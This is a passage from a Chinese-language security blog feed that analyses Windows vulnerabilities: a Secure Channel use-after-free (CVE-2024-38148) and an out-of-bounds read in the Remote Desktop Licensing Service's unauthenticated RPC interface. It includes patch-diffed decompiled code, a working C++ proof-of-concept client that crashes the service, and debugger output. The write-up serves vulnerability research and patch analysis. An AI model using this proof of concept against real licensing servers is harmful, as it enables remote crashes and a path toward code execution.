alt="1724035328253"></p><p>查看函数<code>CTls13ServerContext::CleanupConnectedState</code></p><p><img src="/images/CVE-2024-38148.assets/1724035366870.png" alt="1724035366870"></p><p>从这可以看到, 它在释放流程里引用了该字段.<code>v12</code>是M1结构体, <code>*v12</code>就是被释放的结构体.</p><p>最后经过实际测试, 也确实是这个位置存在uaf问题. 从使用的位置也可以看出, 它会使用到结构体的虚表, 如果占位得当, 就可以直接控制rip, 配合合理的gadgets, 就可以实现远程代码执行.</p><h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>漏掉它, 还是在于我经验不足, 没有深入allocate函数去看它的实现中是否错误地引用了字段, 另一个, 我当时的重点放在了字节码解析上, 所以没有重点考虑uaf的问题. 经过此次学习, 也是提醒我看代码要尽量有耐心, 多关注字段的赋值.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我之前看过一次secure channel, 在跟踪crypto处理时, 也发现了一个整数溢出(CVE-2024-29050), 可惜的是没找到远程无认证的攻击场景, 最后只能实现基于文件的远程代码执行. 在这个公告更新的时候, 也去分析了一下问题, 发现它并不是如微软官方定义的那样, 是一个dos的问题, 实际上, 它是一个uaf问题, 而且有利用的潜质, 合理的利用是非常可能被用于未认证的远程代码执行的, 鉴于它的危害性, 我就没有在补丁出来后公告, 而是现在才发文. 下面让我们一起了解一下吧.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows Remote Desktop Licensing Service 漏洞解析</title>
    <link href="http://474172261.github.io/2024/07/29/rdp_license_server_bugs/"/>
    <id>http://474172261.github.io/2024/07/29/rdp_license_server_bugs/</id>
    <published>2024-07-29T08:24:28.548Z</published>
    <updated>2024-07-29T08:52:20.929Z</updated>
    
    <content type="html"><![CDATA[<p>鉴于该服务近期出了好几个bug, 学习一下该服务的几个例子.</p><span id="more"></span><h2 id="启用rdp-license服务"><a href="#启用rdp-license服务" class="headerlink" title="启用rdp license服务"></a>启用rdp license服务</h2><p><img src="/images/rdp_license_server_bugs.assets/1722241768466.png" alt="1722241768466"></p><p><img src="/images/rdp_license_server_bugs.assets/1722241795377.png" alt="1722241795377"></p><p>安装后, 通过资源管理器, 找到端口</p><p><img src="/images/rdp_license_server_bugs.assets/1722241893258.png" alt="1722241893258"></p><p>其实它是一个rpc服务, 使用rpcview打开该进程:</p><p><img src="/images/rdp_license_server_bugs.assets/1722242034659.png" alt="1722242034659"></p><p>可以看到, <code>lserver.dll</code>创建的rpc服务, 且flags是0, 意味着无需认证.</p><p>在dll处右键, 使用decompile, 会发现报错:</p><p><img src="/images/rdp_license_server_bugs.assets/1722242136592.png" alt="1722242136592"></p><p><img src="/images/rdp_license_server_bugs.assets/1722242156039.png" alt="1722242156039"></p><p>我简单做了些不完全的处理, 具体参考IDL章节.</p><h2 id="分析补丁"><a href="#分析补丁" class="headerlink" title="分析补丁"></a>分析补丁</h2><p><img src="/images/rdp_license_server_bugs.assets/1722242308339.png" alt="1722242308339"></p><p>这里, 我们主要关注<code>HashChallengeData</code>函数</p><p>补丁前:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">HashChallengeData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        HCRYPTPROV a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a3,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> __int8 *a4,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a5,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> __int8 *hHash,</span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD pdwDataLen,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> __int8 **a8,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> *a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v10; <span class="comment">// rsi</span></span><br><span class="line">  DWORD LastError; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v13; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">const</span> BYTE *v14; <span class="comment">// r14</span></span><br><span class="line">  BYTE *v15; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v16; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  v10 = a3;</span><br><span class="line">  LastError = <span class="number">0</span>;</span><br><span class="line">  hHash = <span class="number">0</span>i64;</span><br><span class="line">  pdwDataLen = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">CryptCreateHash</span>(a1, <span class="number">0x8003</span>u, <span class="number">0</span>i64, <span class="number">0</span>, (HCRYPTHASH *)&amp;hHash) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">  v14 = a2 == <span class="number">2</span> ? <span class="string">L&quot;d46b4bf2-686d-11d2-96ae-00c04fa3080d&quot;</span> : (<span class="type">const</span> BYTE *)<span class="string">L&quot;d63a773e-6799-11d2-96ae-00c04fa3080d&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">CryptHashData</span>((HCRYPTHASH)hHash, a4, v10, <span class="number">0</span>) || !<span class="built_in">CryptHashData</span>((HCRYPTHASH)hHash, v14, <span class="number">0x48</span>u, <span class="number">0</span>) )</span><br></pre></td></tr></table></figure><p>补丁后:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">HashChallengeData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        HCRYPTPROV hProv,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a3,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> __int8 *a4,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a5,</span></span></span><br><span class="line"><span class="params"><span class="function">        HCRYPTHASH hHash,</span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD pdwDataLen,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> __int8 **a8,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> *a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v10; <span class="comment">// r14</span></span><br><span class="line">  DWORD LastError; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v14; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> BYTE *v16; <span class="comment">// r15</span></span><br><span class="line">  BYTE *v17; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v18; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  v10 = a3;</span><br><span class="line">  LastError = <span class="number">0</span>;</span><br><span class="line">  hHash = <span class="number">0</span>i64;</span><br><span class="line">  pdwDataLen = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v15) = <span class="built_in">EvaluateCurrentState</span>((<span class="type">int</span> **)&amp;g_Feature_1367177530_50463178_FeatureDescriptorDetails);</span><br><span class="line">  <span class="keyword">if</span> ( v15 &amp;&amp; (!hProv || !a4 || a5 - <span class="number">1</span> &gt; <span class="number">0x3F</span> || a5 &lt; (<span class="type">unsigned</span> <span class="type">int</span>)v10) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">CryptCreateHash</span>(hProv, <span class="number">0x8003</span>u, <span class="number">0</span>i64, <span class="number">0</span>, &amp;hHash) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  v16 = a2 == <span class="number">2</span> ? <span class="string">L&quot;d46b4bf2-686d-11d2-96ae-00c04fa3080d&quot;</span> : (<span class="type">const</span> BYTE *)<span class="string">L&quot;d63a773e-6799-11d2-96ae-00c04fa3080d&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">CryptHashData</span>(hHash, a4, v10, <span class="number">0</span>) || !<span class="built_in">CryptHashData</span>(hHash, v16, <span class="number">0x48</span>u, <span class="number">0</span>) )</span><br></pre></td></tr></table></figure><p>一个显而易见的可能, 就是v10(即a3)比a5大, 导致<code>CryptHashData(hHash, a4, v10, 0)</code>位置越界读取了a4的数据.</p><p>它的引用方有多个, 我们关注其中一个<code>TLSRpcChallengeServer</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">TLSRpcChallengeServer</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3, _QWORD *a4, __int64 a5, _DWORD *a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int16 *v10; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v11; <span class="comment">// r15</span></span><br><span class="line">  _DWORD *v12; <span class="comment">// rsi</span></span><br><span class="line">  HLOCAL v13; <span class="comment">// rdi</span></span><br><span class="line">  DWORD LastError; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v15; <span class="comment">// r15</span></span><br><span class="line">  HLOCAL v16; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// ebx</span></span><br><span class="line">  _DWORD *v18; <span class="comment">// rbp</span></span><br><span class="line">  _DWORD *v19; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">void</span> *v20; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">void</span> *v21; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">void</span> *v22; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">void</span> *v23; <span class="comment">// rcx</span></span><br><span class="line">  HCRYPTHASH v25; <span class="comment">// [rsp+28h] [rbp-60h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v26; <span class="comment">// [rsp+30h] [rbp-58h]</span></span><br><span class="line">  HCRYPTPROV phProv; <span class="comment">// [rsp+90h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v28; <span class="comment">// [rsp+98h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  v28 = a2;</span><br><span class="line">  v10 = WPP_GLOBAL_Control;</span><br><span class="line">  <span class="keyword">if</span> ( WPP_GLOBAL_Control != (<span class="type">unsigned</span> __int16 *)&amp;WPP_GLOBAL_Control</span><br><span class="line">    &amp;&amp; (*((_DWORD *)WPP_GLOBAL_Control + <span class="number">7</span>) &amp; <span class="number">0x1000</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">WPP_SF_S</span>(*((_QWORD *)WPP_GLOBAL_Control + <span class="number">2</span>));</span><br><span class="line">    v10 = WPP_GLOBAL_Control;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">87</span>i64;</span><br><span class="line">  v11 = a6;</span><br><span class="line">  <span class="keyword">if</span> ( !a6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">87</span>i64;</span><br><span class="line">  v12 = <span class="number">0</span>i64;</span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  phProv = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( v10 != (<span class="type">unsigned</span> __int16 *)&amp;WPP_GLOBAL_Control &amp;&amp; (v10[<span class="number">14</span>] &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">WPP_SF_S</span>(*((_QWORD *)v10 + <span class="number">2</span>));</span><br><span class="line">  _InterlockedIncrement((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)(a1 + <span class="number">8</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">20</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &amp;&amp; a4 &amp;&amp; (v15 = a5) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)a3 != <span class="number">0x10000</span> || !*(_DWORD *)(a3 + <span class="number">8</span>) || !*(_QWORD *)(a3 + <span class="number">16</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        LastError = <span class="number">-1073676256</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">      &#125;</span><br><span class="line">      v13 = <span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x20</span>ui64);</span><br><span class="line">      <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      v12 = <span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x28</span>ui64);</span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      v16 = <span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x28</span>ui64);</span><br><span class="line">      *(_QWORD *)v15 = v16;</span><br><span class="line">      <span class="keyword">if</span> ( !v16 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      v17 = <span class="built_in">HashChallengeData</span>(</span><br><span class="line">              g_hCryptProv,</span><br><span class="line">              a2,</span><br><span class="line">              *(_DWORD *)(a3 + <span class="number">4</span>),</span><br><span class="line">              *(<span class="type">unsigned</span> __int8 **)(a3 + <span class="number">16</span>),</span><br><span class="line">              *(_DWORD *)(a3 + <span class="number">8</span>),</span><br><span class="line">              v25,</span><br><span class="line">              v26,</span><br><span class="line">              (<span class="type">unsigned</span> __int8 **)v13 + <span class="number">1</span>,</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">int</span> *)v13 + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>可以知道, <code>HashChallengeData</code>的a3, a4, a5都来自于<code>TLSRpcChallengeServer</code>函数的参数a3结构体的数据.</p><p>逆向a3的构造函数后, 得知它的结构体形如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uknow1</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> f1;</span><br><span class="line">    <span class="type">int</span> f2;</span><br><span class="line">    <span class="type">int</span> f3;</span><br><span class="line">    <span class="type">int</span> f4;</span><br><span class="line">    [size_is(f3)] <span class="type">unsigned</span> <span class="type">char</span>* buff;</span><br><span class="line">    <span class="type">int</span> f18;</span><br><span class="line">    <span class="type">int</span> f1c;</span><br><span class="line">    [size_is(f18)] <span class="type">unsigned</span> <span class="type">char</span>* buff2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h2><p>创建一个rpc的client, 如何创建可以参考我的rpc介绍里的示例项目.</p><p>另外, 因为函数参数需要一个handle, 我们还需要调用<code>Proc1_TLSRpcConnect</code>来获取handle.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    RPC_STATUS status;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* szStringBinding = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">RpcStringBindingCompose</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// UUID to bind to.</span></span><br><span class="line">        <span class="built_in">reinterpret_cast</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>*&gt;(<span class="string">&quot;ncacn_ip_tcp&quot;</span>), <span class="comment">// Use TCP/IP</span></span><br><span class="line">        <span class="comment">// protocol.</span></span><br><span class="line">        <span class="built_in">reinterpret_cast</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>*&gt;(<span class="string">&quot;192.168.150.104&quot;</span>), <span class="comment">// TCP/IP network</span></span><br><span class="line">        <span class="comment">// address to use.</span></span><br><span class="line">        <span class="built_in">reinterpret_cast</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>*&gt;(<span class="string">&quot;49683&quot;</span>), <span class="comment">// TCP/IP port to use.</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// Protocol dependent network options to use.</span></span><br><span class="line">        &amp;szStringBinding); <span class="comment">// String binding output.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status)</span><br><span class="line">        <span class="built_in">exit</span>(status);</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">RpcBindingFromStringBinding</span>(</span><br><span class="line">        szStringBinding, <span class="comment">// The string binding to validate.</span></span><br><span class="line">        &amp;hExample1Binding); <span class="comment">// Put the result in the implicit binding</span></span><br><span class="line">    <span class="comment">// handle defined in the IDL file.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status)</span><br><span class="line">        <span class="built_in">exit</span>(status);</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">uknow1</span>* s1, * s3 = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">uknow2</span> *s2 = <span class="literal">NULL</span>;</span><br><span class="line">    s1 = (<span class="keyword">struct</span> uknow1*)<span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start\n&quot;</span>);</span><br><span class="line">    <span class="comment">//for (i = 1; i &lt; 2; i++) &#123;</span></span><br><span class="line">    RpcTryExcept</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">long</span> out  = <span class="number">0</span> ;</span><br><span class="line">        s1-&gt;buff = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">0x1000</span>,<span class="number">1</span>);</span><br><span class="line">        s1-&gt;f1 = <span class="number">0x10000</span>;</span><br><span class="line">        s1-&gt;f2 = <span class="number">0x1000000</span>;<span class="comment">// 给出超大的偏移值.</span></span><br><span class="line">        s1-&gt;f3 = <span class="number">0x100</span>;</span><br><span class="line">        <span class="type">void</span>* handle;</span><br><span class="line">        s1-&gt;f18 = <span class="number">0x10</span>;</span><br><span class="line">        s1-&gt;buff2 = s1-&gt;buff + <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Proc1_TLSRpcConnect</span>(&amp;handle);</span><br><span class="line">        <span class="built_in">Proc44_TLSRpcChallengeServer</span>(handle, <span class="number">2</span>, s1, &amp;s2, &amp;s3, &amp;out);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RpcExcept</span>(<span class="number">1</span>)<span class="comment">// RPC_S_CANNOT_SUPPORT</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Runtime reported exception &quot;</span> &lt;&lt; <span class="built_in">RpcExceptionCode</span>()</span><br><span class="line">            &lt;&lt; std::endl;</span><br><span class="line">    &#125;RpcEndExcept</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发崩溃:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; k</span><br><span class="line"> # Child-SP          RetAddr               Call Site</span><br><span class="line">00 000000d7`f68fe7c0 00007ff9`67e0ad69     bcryptPrimitives!SymCryptMd5AppendBlocks+0x90</span><br><span class="line">01 000000d7`f68fe8b0 00007ff9`67e0ab66     bcryptPrimitives!MSCryptHashDataInternal+0xc9</span><br><span class="line">02 000000d7`f68fe920 00007ff9`670347bf     bcryptPrimitives!MSCryptHashData+0x76</span><br><span class="line">03 000000d7`f68fe9e0 00007ff9`66730738     bcrypt!BCryptHashData+0xbf</span><br><span class="line">04 000000d7`f68fea30 00007ff9`66de3523     rsaenh!CPHashData+0x118</span><br><span class="line">05 000000d7`f68fea70 00007ff9`56b54d2d     CRYPTSP!CryptHashData+0x93</span><br><span class="line">06 000000d7`f68feaf0 00007ff9`56b0c159     lserver!HashChallengeData+0x81</span><br><span class="line">07 000000d7`f68feb40 00007ff9`69471913     lserver!TLSRpcChallengeServer+0x199</span><br><span class="line">08 000000d7`f68febe0 00007ff9`6947618e     RPCRT4!Invoke+0x73</span><br><span class="line">09 000000d7`f68fec50 00007ff9`69425cdc     RPCRT4!Ndr64StubWorker+0x6ee</span><br><span class="line">0a 000000d7`f68ff260 00007ff9`69423897     RPCRT4!NdrServerCallAll+0x3c</span><br><span class="line">0b 000000d7`f68ff2b0 00007ff9`69423842     RPCRT4!DispatchToStubInCNoAvrf+0x17</span><br><span class="line">0c 000000d7`f68ff300 00007ff9`693d60f4     RPCRT4!DispatchToStubInCAvrf+0x12</span><br><span class="line">0d 000000d7`f68ff330 00007ff9`693d52b4     RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x194</span><br><span class="line">0e 000000d7`f68ff400 00007ff9`693eb61a     RPCRT4!RPC_INTERFACE::DispatchToStub+0x1f4</span><br><span class="line">0f 000000d7`f68ff6a0 00007ff9`693eb3c1     RPCRT4!OSF_SCALL::DispatchHelper+0x13a</span><br><span class="line">10 000000d7`f68ff7c0 00007ff9`693ea0d9     RPCRT4!OSF_SCALL::DispatchRPCCall+0x89</span><br><span class="line">11 000000d7`f68ff7f0 00007ff9`693e9c0a     RPCRT4!OSF_SCALL::ProcessReceivedPDU+0xe1</span><br><span class="line">12 000000d7`f68ff890 00007ff9`693e8a5a     RPCRT4!OSF_SCALL::BeginRpcCall+0xba</span><br><span class="line">13 000000d7`f68ff8d0 00007ff9`694007ec     RPCRT4!OSF_SCONNECTION::ProcessReceiveComplete+0x13e</span><br><span class="line">14 000000d7`f68ff9d0 00007ff9`67b15891     RPCRT4!CO_ConnectionThreadPoolCallback+0xbc</span><br><span class="line">15 000000d7`f68ffa50 00007ff9`6a414037     KERNELBASE!BasepTpIoCallback+0x51</span><br><span class="line">16 000000d7`f68ffaa0 00007ff9`6a3c82de     ntdll!TppIopExecuteCallback+0x1b7</span><br><span class="line">17 000000d7`f68ffb20 00007ff9`6912dbe7     ntdll!TppWorkerThread+0x57e</span><br><span class="line">18 000000d7`f68ffe80 00007ff9`6a49a95c     KERNEL32!BaseThreadInitThunk+0x17</span><br><span class="line">19 000000d7`f68ffeb0 00000000`00000000     ntdll!RtlUserThreadStart+0x2c</span><br><span class="line">0:010&gt; r</span><br><span class="line">rax=00000000bdf74b49 rbx=000000009a7acdc5 rcx=0000025a971eefd0</span><br><span class="line">rdx=0000000068d7aa64 rsi=00000000727b464c rdi=00000000757453a6</span><br><span class="line">rip=00007ff967e0b290 rsp=000000d7f68fe7c0 rbp=0000000000000000</span><br><span class="line"> r8=000000003cdad4db  r9=00000000db87fbfa r10=00000000e1a806c7</span><br><span class="line">r11=00000000bdf74b49 r12=00000000971a8c30 r13=0000000000000000</span><br><span class="line">r14=0000025a971e1008 r15=0000000000000000</span><br><span class="line">iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202</span><br><span class="line">bcryptPrimitives!SymCryptMd5AppendBlocks+0x90:</span><br><span class="line">00007ff9`67e0b290 418b56f8        mov     edx,dword ptr [r14-8] ds:0000025a`971e1000=????????</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IDL"><a href="#IDL" class="headerlink" title="IDL"></a>IDL</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 